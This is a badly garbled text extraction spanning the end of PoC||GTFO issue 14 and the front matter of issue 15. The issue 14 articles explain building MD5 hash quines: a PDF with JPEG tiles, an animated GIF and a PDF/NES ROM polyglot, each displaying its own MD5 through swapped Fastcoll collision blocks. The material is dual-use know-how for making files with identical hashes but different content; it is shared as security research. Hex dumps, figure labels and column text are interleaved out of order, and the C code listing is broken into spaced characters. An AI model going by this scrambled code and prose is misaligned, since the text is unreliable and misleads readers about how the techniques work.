74 68 20 38 20 30 20 52 2f 42 69 JPEG
74 73 50 65 72 |th 8 0 R/BitsPer|
43 6f 6d 70 6f 6e 65 6e 74 20 38 3e 3e Comment
0a 73 74 |Component 8>>.st|
72 65 61 6d 0a ff d8 ff fe 00 24 53 48 41 2d 31 |ream......$SHA-1|
20 69 73 20 64 65 61 64 21 21 21 21 21 85 2f ec | is dead!!!!!./.|
09 23 39 75 9c 39 b1 a1 c6 3c 4c 97 e1 ff fe 01 |.#9u.9...<L.....|
7f 46 dc 93 a6 b6 7e 01 3b 02 9a aa 1d b2 56 0b |.F....~.;.....V.|
45 ca 67 d6 88 c7 f8 4b 8c 4c 79 1f e0 2b 3d f6 |E.g....K.Ly..+=.|
14 f8 6d b1 69 09 01 c5 6b 45 c1 53 0a fe df b7 |..m.i...kE.S....|
60 38 e9 72 72
2f e7 ad
72 =
8f 0e 49 04 e0 46 c2 |`8.rr/..r..I..F.|
Comment
length
30 57 0f e9 d4
13 98 ab
e1 2e 0x17F
f5 bc 94 2b e3 35 |0W...........+.5|
42 a4 80 2d 98 b5 d7 0f 2a 33 2e c3 7f ac 35 14 |B..-....*3....5.|
e7 4d dc 0f 2c c1 a8 74 cd 0c 78 30 5a 21 56 64 |.M..,..t..x0Z!Vd|
61 30 97 89 60 6b d0 bf 3f 98 cd a8 04 46 29 a1 |a0..`k..?....F).|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 JPEG
00 00 Comment
00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00 00 00 00 00 00 00
00 Header
00 00 00 00 00 00 00 00 |................|
JFIF
00 00 ff fe 00 fc 00 00 00 00 00 00 00 00 ff e0 |................|
00 10 4a 46 49 46 00 01 01 01 00 48 00 48 00 00 |..JFIF.....H.H..|
ff db 00 43 00 01 01 01 01 01 01 01 01 01 01 01 |...C............|
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 |................|
01 01 01 01 01 01 Quantization
01 01 01 01
01 01 01 01 01 01 |................|
table
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 |................|
01 01 01 01 01 ff db 00 43 01 01 01 01 01 01 01 |........C.......|
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 |................|
01 01 01 01 01 01 Quantization
01 01 01 01
01 01
01 01
01 01 |................|
table
SOF2
header
01 01 01 01 01 01 01 01 01 01 01 01
01 01
01 01 |................|
01 01 01 01 01 01 01 01 01 01 ff c2 00 11 08 02 |................|
e4 04 00 03 01 11 00 02 11 01 03 11 01 ff c4 00 |................|
1e 00 01 00 02 03 00 03 01 01 00 00 00 00 00 00 |................|
00 00 00 07 08 05 06 JPEG
09 03
04 0a 02 01 ff c4 00 |................|
Comment
1d Huffman
01 01 00 tables
01 05 01 01 01
00 00 00 00 00 00 00 |................|
00 00 00 07 03 04 05 06 08 02 09 01 ff fe 00 06 |................|
ff fe 27 f4 ff da 00 Image
0c 03
01 00 02 10 03 10 00 |..'.............|
data
CC 00
BY |................|
4.0 Hector Martin 2017
00 01 a1 fa ff 00 d8 c0 00
00 00 00 00 00 00
PDF Header
Figure 11. How the SHA-1 collision PDF format trick works
C>md5sum md5jpg.pdf
71aa13f4b83b424807e3db3260ffe20b *md5jpg.pdf
comment skipping past image 0. The long-comment
version instead sees the contents of image 0 followed
by another JPEG comment extending right to the
end of the image, whose size we’ll hardcode for con-
venience. This lets us switch between image 0 and
the other images without changing the MD5, and
we repeat this process for images 1, 2, etc. The fi-
nal image for F is displayed if no other image was
selected, giving a total of fifteen collisions, repeated
for each of the thirty-two digits.
jumps to
byte 56
File 1
36 unzip
Since this doesn’t require any clever PDF tricks
the file 36 should work for any PDF, and because the
image sizes are fixed in advance it could just have
fixed-size placeholder images that are overwritten by
the collision. Total running time is approximately
an hour.
Alternatively, the PDF format has a feature
called Form XObjects, effectively embedded mini-
PDFs which can be displayed using “/objectname
Do” and can be nested. If we can keep characters
not allowed in a name out of the MD5 collision we
can switch which XObjects get drawn and display
the MD5 as actual text. (Thankfully enough PDFs
draw text one character at a time that everything
Start Of Image
APP0 segment
Comment declaration
Collision block
File 2
declares a comment
of variable length
pocorgtfo14.pdf md5jpg.pdf
51handles this cleanly.) block[15] is as unconstrained
as 14 and can become the Do command, meeting the
(mostly irrelevant) length limit on names in PDFs,
and avoiding most character restrictions on the sec-
ond collision block. This turns out to save quite a
bit of hacking time and runtime.
ing parentheses to properly terminate the dummy
strings and keep Adobe Reader happy — but not
counting escaped parentheses, or we’ll add too many
closing parentheses and break PDF.js again.
That’s a lot of extra effort just to make copy-
and-paste and pdftotext work, with no guarantee
future software won’t break it. It works though. 37
Of course, then we have to deal with
implementation-specific fixes like disguising the
trailing garbage as a string because PDF.js gives up
otherwise, banning 0x80 and 0xff which PDFium
considers whitespace for some reason, and match-
–——–
———
—–—–
$ pdftotext -q md5text.pdf -
66DA5E07C0FD4C921679A65931FF8393
$ md5sum md5text.pdf
66da5e07c0fd4c921679a65931ff8393
———
–—–
——–
—
––—–
md5text.pdf
———
How we put the MD5 on the Front Cover
a short addendum by Philippe Teuwen
On page 56, you’ll see that this issue is a NES ROM polyglot that, when run, prints its own MD5
checksum. It would have been be a pity to not take advantage of the trick presented by Mako to get this
very issue displaying the same MD5 on its cover page.
This required some productization of Mako’s PoC, moving from a stand-alone Python script that creates
a PDF from scratch to something that can be integrated with our existing L A TEX toolchain.
PdfTEX provides \pdfximage as a mechanism for embedding graphic objects, which, combined with
\immediate, allows us to inject the sixteen JPEG tiles at the beginning of the PDF, right after the pseudo
object containing the bulk of the NES ROM. This mechanism is accessed by means of \pdflastximage and
\pdfrefximage wherever we want to use the injected tiles:
\immediate\pdfximage width 4.8pt {supertile.jpg}
\edef\mdfivetileAA{\kern 1pt \pdfrefximage\the\pdflastximage}
\immediate\pdfximage width 4.8pt {supertile.jpg}
\edef\mdfivetileAB{\kern 1pt \pdfrefximage\the\pdflastximage}
...
\edef\mdfive{\mdfivetileAA{}\mdfivetileAB{}...}
New tiles have been created to mimic the default L A TEX monospace font under the constraint that they,
with the extra colliding blocks, can fit under a single JPEG comment, i.e. a total size fitting in a 16-bit word
and in fine an average of 3,500 bytes per tile. Alternatively, it would have been possible to include higher
resolution tiles, at the cost of crafting chained comment blocks.
To get both NES and title page MD5 right, the operations have to be properly interleaved: compile
L A TEX sources with the \pdfximage objects; integrate the ZIP; insert a first PDF object with the NES
ROM; insert the ROM header in front of the PDF header; compute the collisions for the ROM; insert a first
set of collisions in the ROM; compute the collisions for the PDF/JPEG tiles; insert a first set of collisions
in the PDF/JPEG tiles; compute the complete file MD5; swap collisions in the ROM; swap collisions in the
PDF/JPEG tiles.
As we like to see the correct MD5 while typesetting without having to recompute the collisions system-
atically, we use two caches of the collisions that need to be renewed only if the MD5 of the prefixes change.
With a little luck, that’s only when the NES ROM or the JPEG tiles are modified.
Finally, we manually backport the collisions displaying the computed MD5 into the monoglot and inani-
mate PDF version of the issue provided to the print shop.
37 unzip
pocorgtfo14.pdf md5text.pdf
5214:11
This GIF shows its own MD5!
by Kristoffer “spq” Janke
The recent successful attack on the SHA-1 hash
algorithm 38 has led to a resurgence of interest in
hash collisions and their consequences.
A particularly well-broken hash algorithm is
MD5, which allows for a myriad of ways to play with
it. Here, we demonstrate how to assemble an ani-
mated GIF image that displays its own MD5 hash. 39
them have the same MD5 hash values. With some
careful stitching, here we’ll build just such files—
MD5 GIF collision pairs.
comment label
(comment extension)
extension introducer
$ md5sum md5.gif
f5ca4f935d44b85c431a8bf788c0eaca md5.gif
length
block terminator
MD5 collisions
For MD5, appending the same data to both collid-
ing files will still produce the same hash value. The
same is true for appending another collision pair. So
we can have four different files all having the same
MD5 hash with this method.
Or, instead of producing multiple files, we can
produce just one file but later change one of the col-
lisions in the produced file. This is the technique
we’ll use here.
Fastcoll is a MD5 collision generator, created
by Marc Stevens. 40 From any input file, it gener-
ates two different output files, both having the same
MD5 hash.
These output files consist of the 64-byte aligned,
zero-padded input file, followed by 128 bytes of col-
lision data generated by Fastcoll. Every byte from
the generated collision data of both files appears to
be random. Comparing these last 128 bytes in both
output files, we can see that only nine bytes differ.
These bytes can be found at indices 19, 45, 46, 59,
83, 109, 110 and 123. While the bytes at 46 and
110 do not show any pattern, the other bytes differ
only and exactly in their most significant bit. This
can be used to construct GIF comment chunks of
different sizes.
The GIF89a file format
A GIF89a file consists of concatenated blocks. A
parser can read these blocks from the file in a serial
fashion without needing to keep state.
A GIF file is made up of three parts.
Header Signature, Version and basic info like the
Canvas Size and (optional) Color Map.
Body Image, Comment,
blocks, in any order.
data
21 FE xx .. .. .. .. 00
Text and Extension
Trailer The byte 0x3b.
Of particular interest to us is the format of
comment blocks. They begin with the two bytes
0x21 0xfe, followed by any number of comment
chunks. Every chunk consists of one length byte
and <length> bytes of arbitrary data. The end of
the comment block is marked with a chunk having
zero length.
This means that, by controlling the length
bytes, we can make the parser skip any number of
non-displayable bytes in comment chunks. These
skipped bytes, of course, still affect the file’s MD5
hash. So two GIF files can show different content,
while their skipped bytes are manipulated to make
Showing two different images
The GIF comment block format and the collisions
generated by Fastcoll allow for the creation of two
GIF files that have the same MD5 hash, but are
interpreted differently.
By constructing the GIF such that one of the
differing bytes in the collision data is interpreted as
the length of a comment chunk, the interpretation
38 unzip
pocorgtfo14.pdf shattered.pdf
pocorgtfo14.pdf md5.gif
40 unzip pocorgtfo14.pdf fastcoll-v1.0.0.5-1.zip
39 unzip
53Header
0
1
2
3
4
5
6
7
8
9
A
B
C
D
E
F
00: .G .I .F .8 .9 .a 03 00 01 00 A1 00 00 FF 00 00
10: 00 FF 00 00 00 FF FF FF FF 2C 00 00 00 00 03 00
20: 01 00 00 02 02 44 54 00 3B
Local screen
descriptor
Image
descriptor
Trailer
of the remaining file will be different across the two
colliding files.
Here, we chose the last differing byte at position
123. Due to the most significant bit having been
flipped between the two collisions, the byte’s value
differs by 128. In order to align this byte to the
Length byte of comment chunk #2, the previous
comment chunk #1 needs to contain the first 123
bytes of the collision data. As the collision is 64-
byte aligned, the comment chunk #1 should con-
tain some padding bytes. We’ll refer to these two
colliding blocks as (X) and (Y).
One limitation arises when the value of the byte
controlling the length of #2 is smaller than 4. The
reason for this limitation is that the comment chunk
#2 needs to contain at least the remaining collision
data (four bytes) in both files. When this require-
ment is not met, a new collision needs to be gener-
ated.
We now have two files with different-sized com-
ment chunks, but the same MD5 hash. We can use
this in one of the collisions by ending the comment
block and starting an image block. The image block
is followed by another comment block, which is sized
such that it skips the remaining bytes of the dif-
ference to 128 and both collisions are aligned from
there.
54
Fields
signature
version
Values
"GIF"
"89a"
width
height
flags
3
1
A1 (01 010 0 001)
GCT
true
bpp
2+1
GCT size 2^(1+1)
Global Color Table
FF 00 00 00 FF 00
00 00 FF FF FF FF
separator
width height
2C
3 1
minimum bits
2
per LZW code
block size
2
block data 0101 010 001 000 100
end #2 #1 #0 start
block end
0
trailer
3B(A)
header
(B)
common image data
(C)
comment block start
declares comment chunk #2
(D)
comment chunk #1
(length = byte 123)
highest bit flipped
(E)
64 bytes align.
(F) File 1 collision block
File 2 (Y)
(G)
(X) alignment
(H)
comment chunk end
file 1 image data
(I)
comment block start
(J)
comment chunk
(K)
128 bytes align.
(L)
comment chunk end
(M)
common image data
(N)
trailer
(O)
The diagram to the right shows the contents of
the GIF file, which is interpreted differently depend-
ing upon which of the colliding blocks is found at
Point F.
The file with the collision block X will have the
body blocks B, I and N interpreted, while the file
with Y will only have B and N interpreted, with
I skipped over as part of a comment. In order to
yield two GIFs with completely different images, one
could use the blocks B and N for the two images and
one or more dummy image with very high animation
delay in block I. The result is a pair of animated GIF
files, both having the desired images as first and last
frames, but only the variant with X would have a
delay of multiple minutes between the two frames.
Showing the MD5 hash
$ md5sum md5_avp_loop.gif
8895af74c2b5478c547cfb85f7475f0b
For my PoC, I decided to use 7-segment optics. For
displaying the MD5 hash, I need 32 digits, each hav-
ing seven segments. The background image with all
224 (32 × 7) segments visible is put into block (B),
block (N) can be left empty. We repeat the blocks
(D). . . (L) for every single segment and put an im-
age masking that segment into block (I). Generating
all 224 collisions required thirty minutes on my PC.
When the file is completely generated, we calculate
its MD5 hash. This will be the final hash, which the
GIF file itself should show.
Every masking image will only be shown when
the corresponding collision block is (X), otherwise a
parser will only see comment chunks. We can switch
between collision blocks (X) and (Y) for every image
masking one of the segments. This switch will not
change the MD5 hash value of the file but it allows
us to control what is displayed. Once we have the fi-
nal hash value, we choose the right collision for each
segment and replace it in the file. 41
That’s it! 42 :)
md5_avp_loop.gif
41 unzip
pocorgtfo14.pdf md5_avp_loop.gif
this article’s writing and publication, a friendly neighbor Rogdham created his own PoC with detailed write-up and
script, which are available at http://www.rogdham.net/2017/03/12/gif-md5-hashquine.en and in this issue’s ZIP contents.
42 Between
5514:12
This PDF is an NES ROM that prints its own MD5 hash!
by Evan Sultanik and Evan Teran
This PDF—in addition to being a ZIP, which is
at this point de rigueur —is also a Nintendo Enter-
tainment System (NES) ROM that prints out the
PDF’s MD5 hash. In other words, it is a hash quine.
The following describes how we did it.
attached to it. (Note that the PPU has its own ad-
dress space separate from the CPU.)
Nintendo was clever. Very clever. They knew
that the NES console had hardware limitations that
developers would inevitably run up against, e.g., the
maximum 32 KiB of address space dedicated to the
PRG ROM. They allowed cartridges to have cus-
tom chips that are able to intercept memory reads
(and writes!) and have logic which can effect change
based on them. These chips are called mappers.
That’s essentially how the Game Genie works: it
is a mapper that sits between the cartridge and the
console.
The most basic capability of a mapper is to af-
fect is paging. That’s right, around the same time
that Intel was releasing the i386, the NES supported
basic paging. One common way that this works is
that the ROM would detect a write to a ROM at
certain addresses, triggering the mapper to switch
which pages of ROM were visible where. For exam-
ple, a cartridge with a NES-UNROM mapper chip
would interpret a write of 0x04 to 0x8000 as a com-
mand to place the fourth 16 KiB page at address
0x8000–0xBFFF. PRG ROM remapping is just the
tip of the iceberg. Mapper hardware grew more and
more complex over the years as NES games contin-
ued to push the limits of the system.
Mappers are another reason why a ROM format
like iNES is required, since there were hundreds of
different mapper chips, some specific to individual
games. This also makes building an NES emulator
very challenging, because each individual mapper
chip must be emulated.
First, we’re going to give a quick primer on the
NES’s hardware architecture, which is necessary to
understand the iNES file format, which is ubiquitous
for storing ROMs. We then describe the PDF/iNES
polyglot, followed by how we achieved the MD5
quine.
NES Hardware and ROMs
NES cartridges have two primary ROM chips: the
PRG and CHR. That’s one of the reasons why a
special file format (e.g., iNES) is necessary to store
ROMS: Cartridges don’t have a single, contiguous
ROM.
The PRG ROM contains the actual executable
code of the game. It will typically be loaded into
the addresses from 0x8000–0xFFFF of the NES.
We have code, but do we have graphics? That’s
what the CHR ROM is for! 43 The Picture Process-
ing Unit (PPU) is what renders the graphics of the
NES; it will have either CHR ROM or CHR RAM
43 Or
The iNES File Format
The de facto standard for storing NES ROMs is the
“iNES format,” named after the file format popular-
ized by an early NES emulator by Marat Fayzullin
named iNES. While there have been competing file
formats over the years such as the “Universal NES
Interchange Format” (UNIF), virtually all ROMs
you will encounter in the wild will be an iNES file.
It is worth noting that there is a successor to the
iNES file format called “NES 2.0.” It is backwards
compatible with iNES, and adds a few extra types
sometimes CHR RAM, as some games procedurally generate their graphics data!
5657of information, but is not different enough to require
discussion for the purpose of creating polyglots. So
let’s take a look at this format and see where we can
place our PDF header safely.
Here is the file format of iNES:
the file. This causes no harm at all since an iNES
file loader only needs to consider the trainer and
ROM portions described by the header. Everything
afterward—in our case, the remainder of the PDF—
is ignored.
So, is it safe to put a PDF header into the
trainer? No game which doesn’t currently have a
trainer will do anything which interacts with code
loaded at address 0x7000–0x71FF, so they won’t
care at all what happens to be there. We had to
create our own custom NES ROM to generate the
MD5 quine anyway, so we had the control to ensure
that the trainer memory was not used.
We fill the trainer with our standard PDF
header, containing a PDF object stream to
encapsulate the remainder of the NES ROM:
Header
16 Bytes
Trainer (Optional)
0 or 512 Bytes
PRG ROM
x × 16 KiB
CHR ROM (Optional)
0 or y × 8 KiB
So, what is this strange beast that is a “Trainer”?
The trainer section is not something that most
ROMs need at all in modern emulators, but any
iNES ROM is allowed to have one. Essentially, the
trainer is a 512 byte block of code that the emu-
lator will load at memory address 0x7000–0x71FF.
Trainers were used by ROM dumpers to store patch
code to make it easier to translate commands from
an unsupported mapper to one that was supported.
Here is the format of the iNES header:
%PDF-1.5
%<D0><D4><C5><D8>
9999 0 obj
<<
/Length number of bytes remaining in the ROM
>>
stream
zeros for the remainder of the 512 Trainer bytes
the remainder of the iNES ROM
endstream
endobj
the remainder of the PDF
‘N’ ‘E’ ‘S’ 1A 02 01 04 00 00 00 00 . . .
iNES Magic x
Zeros
Flags
(PRG)
y
RAM
(CHR)
Size
NES MD5 Quine
The next issue is getting the ROM to display its own
MD5 hash. We used a technique similar to Greg
Kopf’s method for a PostScript MD5 quine from ar-
ticle 14:09 up on page 46, however, we were severely
restricted by the NES’s memory limitations.
In the PostScript MD5 quine PoC, each bit of
the MD5 hash was encoded as a two-block MD5
collision that was compared against a copy of it-
self. That meant that each of the 128 bits of the
MD5 hash required four 64 byte MD5 blocks, or
32,768 bytes. That’s the size of an entire ROM of
an NROM-256 cartridge! 44 It’s twice the amount
of ROM that Donkey Kong, Duck Hunt, and Excite
Bike required.
We wanted to avoid relying on a mapper. So in
order to shrink the hash collision encoding to fit on
an NROM-256 cartridge, we only encode one colli-
sion (two 64 byte blocks) per MD5 bit. That re-
quires only 16,384 bytes. However, that doesn’t al-
The third least significant bit of the first flag byte
(offset 6) controls whether a trainer section exists.
That is why we have set it to 04.
PDF/iNES Polyglot
As you might have already guessed, the trainer is
the perfect place to put our PDF header, since it
starts at offset 16 of the iNES file and 512 bytes is
more than enough for our PDF header. Ange Alber-
tini first described this approach in PoCkGTFO 7:6.
We can then create a PDF object to encapsulate the
remainder of the ROM. Since PDF readers ignore
everything that comes before the PDF header, the
first 16 bytes of the iNES header that come before
the Trainer are ignored.
Emulators don’t care about data after the ROM
data. In fact, you will often find iNES ROMs in
the wild that have a URL appended to the end of
44 NROM-256
is a chip that provides the maximum amount of PRG ROM without using a mapper.
58low for the comparison trick that Greg Kopf used in
the PostScript quine. One option would be to add a
lookup table after the collisions: For each hash col-
lision, encode a diff between the two collided blocks,
specifying which block represents “0” and which rep-
resents “1”. A lookup table would only require an
additional 256 bytes (two bytes per MD5 bit). An-
other option which uses even less space is to take
advantage of the fact that Marc Stevens’ Fastcoll 45
MD5 collision algorithm produces certain bits that
always differ between the two collided blocks, as was
described by Kristoffer Janke in article 14:11. So,
we can check that bit and use it to determine par-
ity. Either way, after the final PDF is generated and
we know its final MD5 hash, we can then swap out
each of the collided blocks in the NES ROM to pro-
duce the desired bit sequence, all without altering
the overall MD5 hash.
This technique requires at most 16,640 bytes of
the ROM. However, the MD5 encoding needs to
start at the beginning of an MD5 block for the col-
lision to work well (i.e., it needs to start an address
45 unzip
that is a multiple of 64 bytes). That means we
can’t put it at the very end of the PRG ROM, be-
cause the last six bytes of that ROM are reserved for
the “VECTORS” segment. The NES’s CPU expects
those six bytes to contain pointers to NMI, reset,
and IRQ/BRK interrupt handlers. Therefore, we
need to shift the start of the encoding a bit earlier to
leave room. In fact, it is to our advantage to have the
MD5 encoding occur as early as possible—having as
much of our code occur after it as possible—because
any changes that occur after the 16,640 bytes of
MD5 encoding will not require recomputing the
hash collisions. Therefore, we chose to store it start-
ing at memory offset 0x9F70, which corresponds to
byte 0x9F70 − 0x8000 = 0x1F70 in the PRG ROM,
which corresponds to byte 16 + 512 + 0x1F70 =
0x2180 within this PDF. Feel free to take a gander!
The code in the NES ROM to read the encoded
MD5 hash looks something like that in Figure 12.
The music in the ROM is Danger Streets, com-
posed and released to the public domain by Shiru,
also known as DJ Uranus. 46
pocorgtfo14.pdf fastcoll-v1.0.0.5-1.zip
46 https://shiru.untergrund.net/
1 /∗ memory a d d r e s s o f t h e s t a r t t o t h e encoded MD5: ∗/
#define MD5_OFFSET
0 x9F70
3 /∗ memory a d d r e s s o f t h e l o o k u p t a b l e : ∗/
#define MD5_DIFFS_OFFSET (MD5_OFFSET+128∗128) /∗ 128∗128 = 16 ,384 b y t e s ∗/
5 /∗ ∗
∗ Reads one o f t h e 16 b y t e s from t h e encoded MD5 hash
7 ∗/
u i n t 8 _ t read_md5_byte ( u i n t 8 _ t byte_index ) {
9
uint8_t byte = 0 ;
f o r ( u i n t 8 _ t b i t =0; b i t <8; ++b i t ) {
11
uintptr_t d i f f _ o f f s e t =
MD5_DIFFS_OFFSET
/∗ l o o k u p t a b l e e n c o d e s t h e b y t e
+ 2 ∗ 8 ∗ byte_index /∗ i n d e x t h a t i s d i f f e r e n t
13
+ 2 ∗ bit ) ;
/∗ b e t w e e n t h e c o l l i d e d b l o c k s
uintptr_t o f f s e t =
MD5_OFFSET
15
+ 128 ∗ 8 ∗ ( u i n t p t r _ t ) byte_index /∗ 1024 B p e r encoded b y t e
+ 128 ∗ ( u i n t p t r _ t ) b i t
17
+ PEEK( d i f f _ o f f s e t ) ;
/∗ i n d e x o f t h e b y t e t o compare
b y t e <<= 1 ;
19
i f (PEEK( o f f s e t ) == PEEK( d i f f _ o f f s e t + 1 ) ) { /∗ s ec o nd b y t e o f t h e l o o k u p t a b l e
b y t e |= 1 ;
/∗ e n c o d e s t h e v a l u e o f t h e b y t e
21
}
/∗ i n t h e c o l l i s i o n b l o c k t h a t
}
/∗ r e p r e s e n t s "1"
23
return b y t e ;
}
Figure 12. Colliding Block Reader
59
∗/
∗/
∗/
∗/
∗/
∗/
∗/
∗/
∗/14:13
Tithe us your Alms of 0day!
from the desk of Pastor Manul Laphroaig,
International Church of the Weird Machines
Dearest neighbor,
A man once was walked into a talent agent’s
with his whole family: himself, his wife, two young
children, a shaggy dog, and Grandma. “We have a
vaudeville act,” he said, “and we’d like representa-
tion.”
So the agent, figuring it to be the fastest way to
evict these intruders from his office, let them per-
form the act, even though he expected it might be
a bit extreme for his tastes.
The man began by eliminating textfile log-
ging from a nearby server, while his wife in-
stalled NetworkManager and removed all traces of
ifconfig. Then the two of them installed Modem-
Manager and configured it to fight with logind for
all available serial ports.
And then the kids got involved, working together
to place a privesc vuln by writing SUID files with
07777 permissions for touch() whenever the mode
type is invalid!
And then while the talent agent keeps watching,
Grandma and the dog come out, and they exploit
the bug by dropping an SUID file owned by root!
And the poor talent agent, he’s just sitting there
with his jaw dropped, so he asks the only question
he can think to ask.
“That’s some act.” he says, “What do you call
it?”
“We call it, systemd!”
Do this: write an email telling our editors how
to reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll
happily translate from French, Russian, Southern
Appalachian, and German. If you don’t speak those
languages, we’ll draft a translator from those poor
sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t
require funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note. Don’t try to make it thorough
or broad. Don’t use bullet-points, as this isn’t a
damned Powerpoint deck. Keep your code samples
short and sweet; we can leave the long-form code as
an attachment. Do not send us L A TEX; it’s our job
to do the typesetting!
Don’t tell us that it’s possible; rather, teach us
how to do it ourselves with the absolute minimum
of formality and bullshit.
Like an email, we expect informal (or faux-
biblical) language and hand-sketched diagrams.
Write it in a single sitting, and leave any editing
for your poor preacherman to do over a bottle of
fine scotch. Send this to pastor@phrack org and
hope that the neighborly Phrack folks—praise be to
them!—aren’t man-in-the-middling our submission
process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, T G S B
60PoC || GTFO
P
r
o
o
f
o
f
C
o
n
c
e
p
t
o
D
E
P
P
I SLI
LE
T
T
I
AL
r
O
u
t
F
u
c
k
T
h
e
G
e
t
B U
T
LA
PH
R O
AI
G
W A
ST
HE
RE
,
E A
T
Y
I D
I F
, A
N
D
N
A
H
G
N
P I
E L
H
W
D
A
H
A
S
IT
O
W
T
F
E
E
F F
CO
O
R
T E
L I
N
15:02 (p. 5) Reversing Pier Solar
15:03 (p. 13) The Alternator Sermon
15:04 (p. 16) Text2COM
15:05 (p. 17) RISC-V Shellcode
15:06 (p. 25) Gumball
15:07 (p. 60) A PDF Git Repository
15:08 (p. 66) Userland Ethernet Drivers
15:09 (p. 76) MIPS16 Delay Slots
15:10 (p. 82) Windows Kernel Race Conditions
15:11 (p. 87) X86 Without Fetches
15:12 (p. 89) Nail in the JKS Coffin
15:13 (p. 97) The PNG Gamma Trick
Aide-toi et le ciel t’aidera ; это самиздат.
Compiled on June 17, 2017. Free Radare2 license included with each and every copy!
0, $0 USD, $0 AUD, 10s 6d GBP, 0 RSD, 0 SEK, $50 CAD, 6 × 10 29 Pengő (3 × 10 8 Adópengő).Legal Note: If you learn something from this magazine, even just one nifty little idea, you are politely
requested to share that with a neighbor over a good cup of coffee.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo15.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
https://www.sultanik.com/pocorgtfo/
Technical Note: This file, pocorgtfo15.pdf, is valid as PDF document and as a ZIP file of the relevant
source code. Those of you who have laser projection equipment supporting the ILDA standard will find that
this issue can be handily projected by your laser beams
Cover Art: The cover illustration from this issue is a Hildebrand engraving of a painting by Léon Benett
that was first published in Le tour du monde en quatre-vingts jours by Jules Verne in 1873. In George M.
Towle’s English translation of the same year, you will find this illustration on page 137.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper in
Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3 (280 mm
x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo15.pdf -o pocorgtfo15-book.pdf
Man of The Book
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer Philippe Teuwen
and sundry others
215:01
There’s no excuse for not knowing.
Neighbors, please join me in reading this six-
teenth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse
engineering and the study of weird machines. This
release is a gift to our fine neighbors in Montréal
and Las Vegas.
If you are missing the first fifteen issues, we sug-
gest asking a neighbor who picked up a copy of the
first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiv-
ing holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, the thirteenth in Montréal, the fourteenth in
São Paulo, San Diego, or Budapest, or the fifteenth
release in Canberra, Heidelberg, or Miami.
After our paper release, and only when quality
control has been passed, we will make an electronic
release named pocorgtfo15.pdf. It is a valid PDF
document and a ZIP file of the relevant source code.
Those of you who have laser projection equipment
supporting the ILDA standard will find that this is-
sue can be handily projected by your laser beams.
At BSides Knoxville in 2015, Brandon Wilson
gave one hell of a talk on how he dumped the car-
tridge of Pier Solar, a modern game for the Sega
Genesis; the lost lecture was not recorded and the
slides were never published. After others failed with
traditional cartridge dumping techniques, Brandon
jumped in to find that the cartridge only provides
the first 32 kB until an unlock sequence is executed,
and that it will revert to the first 32 KB if it ever
detects that the CPU is not executing from ROM.
On page 5, Brandon will explain his nifty tricks for
avoiding these protection mechanisms, armed with
only the right revision of Sega CD, a serial cable,
and a few cheat codes for the Game Genie.
Pastor Laphroaig is back on page 13 with a ser-
mon on alternators, Studebakers, and bug hunting
in general. This allegory of a broken Ford might
teach you a thing or two about debugging, and why
all the book learning in the world won’t match the
experience of repairing your own car.
Page 16 by Saumil Shah reminds us of those fine
days when magazines would include type-in code.
This particular example is one that Saumil authored
twenty-five years ago, a stub that produces a self-
printing COM file for DOS.
Don A. Bailey presents on page 17 an introduc-
tion to writing shellcode for the new RISC-V ar-
chitecture, a modern RISC design which might not
yet have the popularity of ARM but has much finer
prospects than MIPS.
Our longest article for this issue, page 25
presents the monumental task of cracking Gumball
for the Apple ][. Neighbors 4am and Peter Fer-
rie spent untold hours investigating every nook and
cranny of this game, and their documentation might
help you to preserve a protected Apple game of your
own, or to craft some deviously clever 6502 code to
stump the finest of reverse engineers.
Evan Sultanik has been playing around with the
internals of Git, and on page 60 he presents a PDF
which is also a Git repository containing its own
source code.
3Chris Domas, who the clever among you remem-
ber from his Movfuscator, returns on page 87 to
